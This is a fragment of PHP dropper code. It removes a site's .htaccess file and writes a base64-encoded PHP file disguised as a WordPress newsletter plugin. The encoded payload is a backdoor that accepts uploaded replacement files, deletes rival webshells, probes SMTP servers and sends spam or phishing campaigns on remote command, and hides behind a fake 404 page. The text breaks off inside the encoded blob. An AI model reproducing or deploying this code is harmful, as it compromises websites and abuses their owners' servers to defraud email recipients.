
			$Folder = dirname(__FILE__)."/";
			unlink($Folder.".htaccess");
file_put_contents($Folder."wp-newsletter-v75.php", base64_decode("PD9waHANCkBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdFdXJvcGUvTG9uZG9uJyk7DQpAZXJyb3JfcmVwb3J0aW5nKDApOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGluaV9zZXQoJ21lbW9yeV9saW1pdCcsICctMScpOw0KQGRlZmluZSgnTUFJTF9WRVJTSU9OJywgJzEuOS4wJyk7DQpAZGVmaW5lKCdNQUlMX1VSTCcsIEdldE1haWxVUkwoKSk7DQpAZGVmaW5lKCdSRURJUkVDVElPTl9GT0xERVInLCAiemJ5dXh0dWFvIik7DQppZiAoaXNzZXQoJF9HRVRbJ3NlcnZlci1pbmZvcyddKSkgew0KICAgIENyZWF0ZUhUYWNjZXNzKCk7DQogICAgJFNFUlZFUl9JTkZPUyA9ICRfU0VSVkVSOw0KICAgIGlmICghaXNfYXJyYXkoJFNFUlZFUl9JTkZPUykpIHsNCiAgICAgICAgJFNFUlZFUl9JTkZPUyA9IGFycmF5KCk7DQogICAgfQ0KICAgICRTRVJWRVJfSU5GT1NbJ1JFQUxfSVBfR0VUJ10gICAgID0gR2V0UGFnZUNvbnRlbnQoImh0dHA6Ly9teWlwLmRuc29tYXRpYy5jb20vIik7DQogICAgJFNFUlZFUl9JTkZPU1snRVhQTE9JVF9WRVJTSU9OJ10gPSBNQUlMX1ZFUlNJT047DQogICAgZWNobyBqc29uX2VuY29kZSgkU0VSVkVSX0lORk9TKTsNCiAgICBleGl0Ow0KfQ0KJF9TRVJWRVJbJ1BIUF9TRUxGJ10gICAgICAgICAgPSAiL2luZGV4LnBocCI7DQokSFRUUF9TRVJWRVJfVkFSU1snUEhQX1NFTEYnXSA9ICIvaW5kZXgucGhwIjsNCmZvcmVhY2ggKGFycmF5KA0KICAgICdIVFRQX0NMSUVOVF9JUCcsDQogICAgJ0hUVFBfWF9GT1JXQVJERURfRk9SJywNCiAgICAnSFRUUF9YX0ZPUldBUkRFRCcsDQogICAgJ0hUVFBfWF9DTFVTVEVSX0NMSUVOVF9JUCcsDQogICAgJ0hUVFBfRk9SV0FSREVEX0ZPUicsDQogICAgJ0hUVFBfRk9SV0FSREVEJywNCiAgICAnUkVNT1RFX0FERFInDQopIGFzICRrZXkpIHsNCiAgICAkX1NFUlZFUlska2V5XSAgICAgICAgICA9ICIxMjcuMC4wLjEiOw0KICAgICRIVFRQX1NFUlZFUl9WQVJTWyRrZXldID0gIjEyNy4wLjAuMSI7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ3Rlc3QtZXhwbG9pdCddKSkgew0KICAgIGVjaG8gIkVYUExPSVRPSyI7DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnZGVsZXRlLXdzbyddKSkgew0KICAgIGVjaG8gRGVsZXRlQmFkRmlsZXMoKTsNCiAgICBleGl0Ow0KfQ0KZnVuY3Rpb24gRGVsZXRlQmFkRmlsZXMoJGRlbGV0ZSA9IGZhbHNlLCAkZm9sZGVyID0gIiIpIHsNCiAgICAkRmlsZVRvRGVsZXRlICA9IGFycmF5KCk7DQogICAgJEZpbGVMaXN0ICAgICAgPSBTY2FuRm9sZGVyKGRpcm5hbWUoX19GSUxFX18pIC4gIi8iIC4gJGZvbGRlcik7DQogICAgJHdoaXRlRmlsZSAgICAgPSBhcnJheSgNCiAgICAgICAgYmFzZW5hbWUoX19GSUxFX18pLA0KICAgICAgICAiZXJyb3JfbG9nIiwNCiAgICAgICAgIi5odGFjY2VzcyIsDQogICAgICAgICIuaHRtbCIsDQogICAgICAgICIuY3NzIiwNCiAgICAgICAgIi5wbmciLA0KICAgICAgICAiLmdpZiIsDQogICAgICAgICIuanBlZyIsDQogICAgICAgICIuanBnIiwNCiAgICAgICAgIi5pY28iLA0KICAgICAgICAiLmpzIg0KICAgICk7DQogICAgJHdoaXRlRmlsZVByZWcgPSBhcnJheSgpOw0KICAgIGZvcmVhY2ggKCR3aGl0ZUZpbGUgYXMgJHdoaXRlRmlsZVRvQ2hlY2spIHsNCiAgICAgICAgJHdoaXRlRmlsZVByZWdbXSA9IHByZWdfcXVvdGUoJHdoaXRlRmlsZVRvQ2hlY2ssICIvIik7DQogICAgfQ0KICAgICRCbGFja0xpc3QgICAgID0gYXJyYXkoDQogICAgICAgICJkZWZpbmUoJ01BSUxfVkVSU0lPTicsIiwNCiAgICAgICAgIl9mX3dwIg0KICAgICk7DQogICAgJEJsYWNrTGlzdFByZWcgPSBhcnJheSgpOw0KICAgIGZvcmVhY2ggKCRCbGFja0xpc3QgYXMgJEJsYWNrTGlzdFRvQ2hlY2spIHsNCiAgICAgICAgJEJsYWNrTGlzdFByZWdbXSA9IHByZWdfcXVvdGUoJEJsYWNrTGlzdFRvQ2hlY2ssICIvIik7DQogICAgfQ0KICAgICR3aGl0ZUxpc3QgICAgID0gYXJyYXkoDQogICAgICAgICJAcGFja2FnZSIsDQogICAgICAgICJ3cF9uYXZfbWVudSgiLA0KICAgICAgICAiYmxvZ2luZm8oIiwNCiAgICAgICAgImxhbmd1YWdlX2F0dHJpYnV0ZXMoIiwNCiAgICAgICAgImhhc19uYXZfbWVudSgiLA0KICAgICAgICAiYm9keV9jbGFzcygiDQogICAgKTsNCiAgICAkd2hpdGVMaXN0UHJlZyA9IGFycmF5KCk7DQogICAgZm9yZWFjaCAoJHdoaXRlTGlzdCBhcyAkd2hpdGVMaXN0VG9DaGVjaykgew0KICAgICAgICAkd2hpdGVMaXN0UHJlZ1tdID0gcHJlZ19xdW90ZSgkd2hpdGVMaXN0VG9DaGVjaywgIi8iKTsNCiAgICB9DQogICAgZm9yZWFjaCAoJEZpbGVMaXN0IGFzICRGaWxlU2Nhbikgew0KICAgICAgICBpZiAoJEZpbGVTY2FuID09ICIuIiBvciAkRmlsZVNjYW4gPT0gIi4uIiBvciBpc19kaXIoJEZpbGVTY2FuKSBvciAhaXNfZmlsZSgkRmlsZVNjYW4pIG9yICRGaWxlU2NhbiA9PSBiYXNlbmFtZShfX0ZJTEVfXykpIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgIGlmICghcHJlZ19tYXRjaCgnLycgLiBpbXBsb2RlKCJ8IiwgJHdoaXRlRmlsZVByZWcpIC4gJy9pJywgJEZpbGVTY2FuKSkgew0KICAgICAgICAgICAgJEZpbGVDaGVja0NvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJEZpbGVTY2FuKTsNCiAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgnLycgLiBpbXBsb2RlKCJ8IiwgJHdoaXRlTGlzdFByZWcpIC4gJy9pJywgJEZpbGVDaGVja0NvbnRlbnQpIG9yIHByZWdfbWF0Y2goJy8nIC4gaW1wbG9kZSgifCIsICRCbGFja0xpc3RQcmVnKSAuICcvaScsICRGaWxlQ2hlY2tDb250ZW50KSkgew0KICAgICAgICAgICAgICAgIGlmICghaXNfd3JpdGFibGUoJEZpbGVTY2FuKSkgew0KICAgICAgICAgICAgICAgICAgICAkV3JpdGFibGUgPSAnIC0gPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPihUaGlzIGZpbGUgY2FuXCd0IGJlIGVkaXQvZGVsZXRlZCAhKTwvc3Bhbj4nOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRXcml0YWJsZSA9ICcgLSA8c3BhbiBzdHlsZT0iY29sb3I6Z3JlZW47Ij4oVGhpcyBmaWxlIGNhbiBiZSBlZGl0L2RlbGV0ZWQgISk8L3NwYW4+JzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRfR0VUWydhY3Rpb24nXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRfR0VUWydhY3Rpb24nXSA9PSAiZGVsZXRlIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgJEZpbGVUb0RlbGV0ZVtdID0gJEZpbGVTY2FuOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJEZpbGVUb0RlbGV0ZVtdID0gJEZpbGVTY2FuIC4gJFdyaXRhYmxlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkZWxldGUgPT0gdHJ1ZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJEZpbGVUb0RlbGV0ZVtdID0gJEZpbGVTY2FuOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJEZpbGVUb0RlbGV0ZVtdID0gJEZpbGVTY2FuIC4gJFdyaXRhYmxlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICgkX0dFVFsnYWN0aW9uJ10gPT0gImRlbGV0ZSIgb3IgJGRlbGV0ZSA9PSB0cnVlKSB7DQogICAgICAgIGZvcmVhY2ggKCRGaWxlVG9EZWxldGUgYXMgJERlbGV0ZUZpbGUpIHsNCiAgICAgICAgICAgIEB1bmxpbmsoJERlbGV0ZUZpbGUpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAiT0siOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiBqc29uX2VuY29kZSgkRmlsZVRvRGVsZXRlKTsNCiAgICB9DQp9DQppZiAoaXNzZXQoJF9HRVRbJ3NlbGYtdXBkYXRlJ10pKSB7DQogICAgJEN1cnJlbnRGaWxlID0gX19GSUxFX187DQogICAgJFNhdmVDb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRDdXJyZW50RmlsZSk7DQogICAgaWYgKCRfRklMRVNbJ2YnXVsndG1wX25hbWUnXSAhPSAiIikgew0KICAgICAgICBpZiAoQHVubGluayhwcmVnX3JlcGxhY2UoJyFcKFxkK1wpXHMuKiEnLCAnJywgX19GSUxFX18pKSkgew0KICAgICAgICAgICAgaWYgKEBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZiddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmJ11bJ25hbWUnXSkpIHsNCiAgICAgICAgICAgICAgICBlY2hvICJPSyI7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkQ3VycmVudEZpbGUsICRTYXZlQ29udGVudCk7DQogICAgICAgICAgICAgICAgZWNobyAiTk8iOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZWNobyAiTk9fREVMRVRFIjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydjaGVja19tYWlsX3NtdHAnXSkpIHsNCiAgICAkc210cCA9IG5ldyBTTVRQOw0KICAgICRIb3N0ID0gInNtdHAubGl2ZS5jb20iOw0KICAgICRQb3J0ID0gMjU7DQogICAgaWYgKGlzc2V0KCRfR0VUWydob3N0J10pICYmICRfR0VUWydob3N0J10gIT0gIiIpIHsNCiAgICAgICAgJEhvc3QgPSAkX0dFVFsnaG9zdCddOw0KICAgIH0NCiAgICBpZiAoaXNzZXQoJF9HRVRbJ3BvcnQnXSkgJiYgJF9HRVRbJ3BvcnQnXSAhPSAiIikgew0KICAgICAgICAkUG9ydCA9ICRfR0VUWydwb3J0J107DQogICAgfQ0KCSR1cmxTaGVsbCA9IEdldFJlZGlyZWN0aW9uTGluaygkX0dFVFsncmVhbF91cmwnXSk7DQogICAgaWYgKCR1cmxTaGVsbCA9PT0gZmFsc2UpIHsNCiAgICAgICAgZWNobyAiTk9fUkVESVJFQ1RJT04iOw0KICAgICAgICBleGl0Ow0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICBpZiAoISRzbXRwLT5jb25uZWN0KCRIb3N0LCAkUG9ydCwgMTApKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdDb25uZWN0IGZhaWxlZCcpOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHNtdHAtPmhlbGxvKCJsb2NhbGhvc3QubG9jYWxkb21haW4iKSkgew0KICAgICAgICAgICAgJFNNVFBfRVJST1IgPSAkc210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0VITE8gZmFpbGVkOiAnIC4gJFNNVFBfRVJST1JbJ2Vycm9yJ10pOw0KICAgICAgICB9DQogICAgICAgICRlID0gJHNtdHAtPmdldFNlcnZlckV4dExpc3QoKTsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRlKSAmJiBhcnJheV9rZXlfZXhpc3RzKCdTVEFSVFRMUycsICRlKSkgew0KICAgICAgICAgICAgJHRsc29rID0gJHNtdHAtPnN0YXJ0VExTKCk7DQogICAgICAgICAgICBpZiAoISR0bHNvaykgew0KICAgICAgICAgICAgICAgICRTTVRQX0VSUk9SID0gJHNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignRmFpbGVkIHRvIHN0YXJ0IGVuY3J5cHRpb246ICcgLiAkU01UUF9FUlJPUlsnZXJyb3InXSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoISRzbXRwLT5oZWxsbygibG9jYWxob3N0LmxvY2FsZG9tYWluIikpIHsNCiAgICAgICAgICAgICAgICAkU01UUF9FUlJPUiA9ICRzbXRwLT5nZXRFcnJvcigpOw0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0VITE8gKDIpIGZhaWxlZDogJyAuICRTTVRQX0VSUk9SWydlcnJvciddKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRlID0gJHNtdHAtPmdldFNlcnZlckV4dExpc3QoKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNfYXJyYXkoJGUpICYmIGFycmF5X2tleV9leGlzdHMoJ0FVVEgnLCAkZSkpIHsNCiAgICAgICAgICAgIGVjaG8gIk9LIjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCAoRXhjZXB0aW9uICRlKSB7DQogICAgICAgIGVjaG8gJGUtPmdldE1lc3NhZ2UoKTsNCiAgICB9DQogICAgJHNtdHAtPnF1aXQodHJ1ZSk7DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnc2VuZF9jYW1wYWlnbl9waHAnXSkpIHsNCiAgICBDcmVhdGVIVGFjY2VzcygpOw0KICAgIGVjaG8gR2V0UGFnZUNvbnRlbnQodXJsZGVjb2RlKCRfR0VUWydyZWFsX3VybCddKSAuICI/c2VuZF9jYW1wYWlnbl9waHBfYWN0aW9uPXRydWUmcmVhbF91cmw9IiAuICRfR0VUWydyZWFsX3VybCddLCAkX1BPU1QpOw0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ3NlbmRfY2FtcGFpZ25fcGhwX2FjdGlvbiddKSkgew0KICAgICRSZXR1cm5UZXh0ID0gYXJyYXkoKTsNCiAgICAkQWxsQ29tbWFuZCA9IHVuc2VyaWFsaXplKGJhc2U2NF9kZWNvZGUoJF9QT1NUWydjb21tYW5kJ10pKTsNCgkkdXJsU2hlbGwgPSBHZXRSZWRpcmVjdGlvbkxpbmsoJF9HRVRbJ3JlYWxfdXJsJ10pOw0KICAgIGlmICgkdXJsU2hlbGwgPT09IGZhbHNlICYmIHByZWdfbWF0Y2goJy8nIC4gcHJlZ19xdW90ZSgiW3NoZWxsX3Jld3JpdGVfdXJsXSIsICIvIikgLiAnL2knLCAkQ29tbWFuZFsnY29udGVudCddKSkgew0KICAgICAgICBlY2hvICJOT19SRURJUkVDVElPTiI7DQogICAgICAgIGV4aXQ7DQogICAgfQ0KICAgIGZvcmVhY2ggKCRBbGxDb21tYW5kIGFzICRDb21tYW5kKSB7DQogICAgICAgICRtYWlsICAgICA9IG5ldyBTaWx0aHhNYWlsZXI7DQogICAgICAgIA0KICAgICAgICAkc210cCA9IGlzc2V0KCRDb21tYW5kWydzbXRwJ10pID8gJENvbW1hbmRbJ3NtdHAnXSA6ICcnOw0KICAgICAgICBpZiAoaXNfYXJyYXkoJHNtdHApKSB7DQogICAgICAgICAgICBpZiAoaXNzZXQoJENvbW1hbmRbJ3NtdHAnXVsnc2VuZGVyX2VtYWlsJ10pKSB7DQogICAgICAgICAgICAgICAgJEZyb20gPSAkQ29tbWFuZFsnc210cCddWydzZW5kZXJfZW1haWwnXTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJEZyb20gPSAkQ29tbWFuZFsnc210cCddWyd1c2VyJ107DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWFpbC0+aXNTTVRQKCk7DQogICAgICAgICAgICAkbWFpbC0+SG9zdCAgICAgICAgICA9ICRDb21tYW5kWydzbXRwJ11bJ2hvc3QnXTsNCiAgICAgICAgICAgICRtYWlsLT5TTVRQQXV0aCAgICAgID0gdHJ1ZTsNCiAgICAgICAgICAgICRtYWlsLT5TTVRQS2VlcEFsaXZlID0gdHJ1ZTsNCiAgICAgICAgICAgICRtYWlsLT5TTVRQQXV0b1RMUyAgID0gZmFsc2U7DQogICAgICAgICAgICBpZiAoJENvbW1hbmRbJ3NtdHAnXVsnc2VjdXJpdHknXSA9PSAiYXV0byIpIHsNCiAgICAgICAgICAgICAgICAkbWFpbC0+U01UUEF1dG9UTFMgPSB0cnVlOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRDb21tYW5kWydzbXRwJ11bJ3NlY3VyaXR5J10gPT0gInRscyIpIHsNCiAgICAgICAgICAgICAgICAkbWFpbC0+U01UUFNlY3VyZSA9ICd0bHMnOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRDb21tYW5kWydzbXRwJ11bJ3NlY3VyaXR5J10gPT0gInNzbCIpIHsNCiAgICAgICAgICAgICAgICAkbWFpbC0+U01UUFNlY3VyZSA9ICdzc2wnOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJG1haWwtPlBvcnQgICAgID0gJENvbW1hbmRbJ3NtdHAnXVsncG9ydCddOw0KICAgICAgICAgICAgJG1haWwtPlVzZXJuYW1lID0gJENvbW1hbmRbJ3NtdHAnXVsndXNlciddOw0KICAgICAgICAgICAgJG1haWwtPlBhc3N3b3JkID0gJENvbW1hbmRbJ3NtdHAnXVsncGFzcyddOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJERvbWFpbiA9IGdldF9kb21haW4oImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddKTsNCiAgICAgICAgICAgIGlmICgkQ29tbWFuZFsnZnJvbSddICE9ICIiKSB7DQogICAgICAgICAgICAgICAgJEZyb20gPSAkQ29tbWFuZFsnZnJvbSddIC4gJ0AnIC4gJERvbWFpbjsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJERvbWFpbiA9IGdldF9kb21haW4oImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddKTsNCiAgICAgICAgICAgICAgICAkRnJvbSAgID0gJ2NvbnRhY3RAJyAuICREb21haW47DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJG1haWwtPnNldEZyb20oJEZyb20sICRDb21tYW5kWyduYW1lJ10pOw0KICAgICAgICAkbWFpbC0+U2VuZGVyID0gJEZyb207DQogICAgICAgICRtYWlsLT5hZGRBZGRyZXNzKCRDb21tYW5kWyd0byddKTsNCiAgICAgICAgJG1haWwtPlN1YmplY3QgPSAkQ29tbWFuZFsnc3ViamVjdCddOw0KICAgICAgICAkbWFpbC0+WE1haWxlciA9ICcgJzsNCiAgICAgICAgJENvbnRlbnQgICAgICAgPSBzdHJfcmVwbGFjZSgnW3NoZWxsX3Jld3JpdGVfdXJsXScsICR1cmxTaGVsbCwgJENvbW1hbmRbJ2NvbnRlbnQnXSk7DQogICAgICAgIGlmICgkQ29tbWFuZFsnc291cmNlX3R5cGUnXSA9PSAiaHRtbCIpIHsNCiAgICAgICAgICAgICRtYWlsLT5tc2dIVE1MKCRDb250ZW50KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtYWlsLT5pc0hUTUwoZmFsc2UpOw0KICAgICAgICAgICAgJG1haWwtPkJvZHkgICAgPSAkQ29udGVudDsNCiAgICAgICAgICAgICRtYWlsLT5BbHRCb2R5ID0gJENvbnRlbnQ7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRDb21tYW5kWydyZXBseV90byddICE9ICIiKSB7DQogICAgICAgICAgICAkbWFpbC0+QWRkUmVwbHlUbygkQ29tbWFuZFsncmVwbHlfdG8nXSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbWFpbC0+QWRkUmVwbHlUbygkRnJvbSwgJENvbW1hbmRbJ25hbWUnXSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRDb21tYW5kWydmaWxlJ10gIT0gIiIpIHsNCiAgICAgICAgICAgICRGaWxlRXh0ZW5zaW9uID0gcGF0aGluZm8ocGFyc2VfdXJsKCRDb21tYW5kWydmaWxlJ10sIFBIUF9VUkxfUEFUSCksIFBBVEhJTkZPX0VYVEVOU0lPTik7DQogICAgICAgICAgICAkbWFpbC0+YWRkU3RyaW5nQXR0YWNobWVudChHZXRQYWdlQ29udGVudCgkQ29tbWFuZFsnZmlsZSddKSwgJENvbW1hbmRbJ2ZpbGVuYW1lJ10gLiAiLiIgLiAkRmlsZUV4dGVuc2lvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkbWFpbC0+c2VuZCgpKSB7DQogICAgICAgICAgICAkUmV0dXJuVGV4dFtdID0gJENvbW1hbmRbJ2lkJ10gLiAiOjI6IiAuICRtYWlsLT5FcnJvckluZm87DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkUmV0dXJuVGV4dFtdID0gJENvbW1hbmRbJ2lkJ10gLiAiOjE6IjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoZW1wdHkoJFJldHVyblRleHQpKSB7DQogICAgICAgIGVjaG8gIk5PIjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvIGltcGxvZGUoJzp8OicsICRSZXR1cm5UZXh0KTsNCiAgICB9DQogICAgZXhpdDsNCn0NCmlmIChpc3NldCgkX0dFVFsnY2hlY2tfaW5ib3hfcGhwJ10pKSB7DQogICAgZWNobyBHZXRQYWdlQ29udGVudCh1cmxkZWNvZGUoJF9HRVRbJ3JlYWxfdXJsJ10pIC4gIj9jaGVja19pbmJveF9waHBfYWN0aW9uPXRydWUmZW1haWw9IiAuICRfR0VUWydlbWFpbCddIC4gIiZzdWJqZWN0PSIgLiAkX0dFVFsnc3ViamVjdCddIC4gIiZmcm9tPSIgLiAkX0dFVFsnZnJvbSddIC4gIiZyZWFsX3VybD0iIC4gJF9HRVRbJ3JlYWxfdXJsJ10pOw0KICAgIGV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbJ2NoZWNrX21haWxfcGhwJ10pKSB7DQoJJHVybFNoZWxsID0gR2V0UmVkaXJlY3Rpb25MaW5rKCRfR0VUWydyZWFsX3VybCddKTsNCglpZiAoJHVybFNoZWxsID09PSBmYWxzZSkgew0KICAgICAgICBlY2hvICJOT19SRURJUkVDVElPTiI7DQogICAgICAgIGV4aXQ7DQogICAgfQ0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21haWwnKSkgew0KICAgICAgICBlY2hvICJPSyI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZWNobyAiTk8iOw0KICAgIH0NCiAgICBleGl0Ow0KfQ0KaWYgKGlzc2V0KCRfR0VUWydjaGVja19pbmJveF9waHBfYWN0aW9uJ10pKSB7DQogICAgJG1haWwgICAgICAgICAgPSBuZXcgU2lsdGh4TWFpbGVyOw0KICAgICREb21haW4gICAgICAgID0gc3RydG9sb3dlcihnZXRfZG9tYWluKCJodHRwOi8vIiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXSkpOw0KICAgICRFeHBsb2RlRG9tYWluID0gZXhwbG9kZSgiLiIsICREb21haW4pOw0KICAgICROYW1lICAgICAgICAgID0gdWNmaXJzdCgkRXhwbG9kZURvbWFpblswXSk7DQogICAgaWYgKGlzc2V0KCRfR0VUWydmcm9tJ10pKSB7DQogICAgICAgICRGcm9tID0gJF9HRVRbJ2Zyb20nXTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkRnJvbSA9ICdjb250YWN0QCcgLiAkRG9tYWluOw0KICAgIH0NCiAgICAkbWFpbC0+c2V0RnJvbSgkRnJvbSwgJE5hbWUpOw0KICAgICRtYWlsLT5TZW5kZXIgPSAkRnJvbTsNCiAgICAkbWFpbC0+QWRkUmVwbHlUbygkRnJvbSwgJE5hbWUpOw0KICAgICRtYWlsLT5hZGRBZGRyZXNzKCRfR0VUWydlbWFpbCddKTsNCiAgICAkbWFpbC0+U3ViamVjdCA9ICRfR0VUWydzdWJqZWN0J107DQogICAgJG1haWwtPlhNYWlsZXIgPSAnICc7DQogICAgaWYgKGlzc2V0KCRfR0VUWydib2R5J10pKSB7DQogICAgICAgICRtYWlsLT5Cb2R5ID0gJF9HRVRbJ2JvZHknXTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkbWFpbC0+Qm9keSA9ICJIZWxsbywgYXMgeW91IGFzayBvbiBvdXIgd2Vic2l0ZSwgdGhpcyBpcyB5b3VyIGFwaSBrZXkgZm9yIHVzZSBvdXIgc2VydmljZSA6ICIgLiBtZDUodW5pcWlkKHRpbWUoKSkpOw0KICAgIH0NCiAgICBpZiAoISRtYWlsLT5zZW5kKCkpIHsNCiAgICAgICAgZWNobyAiTk8iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGVjaG8gIk9LIjsNCiAgICB9DQogICAgZXhpdDsNCn0NCkRpc3BsYXk0MDRQYWdlKCk7DQpmdW5jdGlvbiBnZXRfZG9tYWluKCR1cmwpIHsNCiAgICAkcGllY2VzID0gcGFyc2VfdXJsKCR1cmwpOw0KICAgICRkb21haW4gPSBpc3NldCgkcGllY2VzWydob3N0J10pID8gJHBpZWNlc1snaG9zdCddIDogJyc7DQogICAgaWYgKHByZWdfbWF0Y2goJy8oP1A8ZG9tYWluPlthLXowLTldW2EtejAtOVwtXXsxLDYzfVwuW2EtelwuXXsyLDZ9KSQvaScsICRkb21haW4sICRyZWdzKSkgew0KICAgICAgICByZXR1cm4gJHJlZ3NbJ2RvbWFpbiddOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQpmdW5jdGlvbiByYW5kU3RyKCRsZW5ndGgpIHsNCiAgICAkY2hhcmFjdGVycyAgICAgICA9ICcwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWic7DQogICAgJGNoYXJhY3RlcnNMZW5ndGggPSBzdHJsZW4oJGNoYXJhY3RlcnMpOw0KICAgICRyYW5kb21TdHJpbmcgICAgID0gJyc7DQogICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgew0KICAgICAgICAkcmFuZG9tU3RyaW5nIC49ICRjaGFyYWN0ZXJzW3JhbmQoMCwgJGNoYXJhY3RlcnNMZW5ndGggLSAxKV07DQogICAgfQ0KICAgIHJldHVybiAkcmFuZG9tU3RyaW5nOw0KfQ0KZnVuY3Rpb24gU2NhbkZvbGRlcigkZGlyKSB7DQogICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJ3NjYW5kaXInKSkgew0KICAgICAgICAkZGggPSBvcGVuZGlyKCRkaXIpOw0KICAgICAgICB3aGlsZSAoZmFsc2UgIT09ICgkZmlsZW5hbWUgPSByZWFkZGlyKCRkaCkpKSB7DQogICAgICAgICAgICAkZmlsZXNbXSA9ICRmaWxlbmFtZTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRmaWxlcyA9IHNjYW5kaXIoJGRpcik7DQogICAgfQ0KICAgIHJldHVybiAkZmlsZXM7DQp9DQpmdW5jdGlvbiBjVVJMUmVxdWVzdCgkdXJsLCAkcG9zdEZpZWxkcyA9IG51bGwsICRodHRwSGVhZGVyID0gYXJyYXkoKSkgew0KICAgICRjaCA9IGN1cmxfaW5pdCgpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GUkVTSF9DT05ORUNULCB0cnVlKTsNCiAgICBpZiAoIWVtcHR5KCRwb3N0RmllbGRzKSkgew0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdEZpZWxkcyk7DQogICAgfQ0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA2LjA7IFdpbmRvd3MgTlQgNi4xOyAuT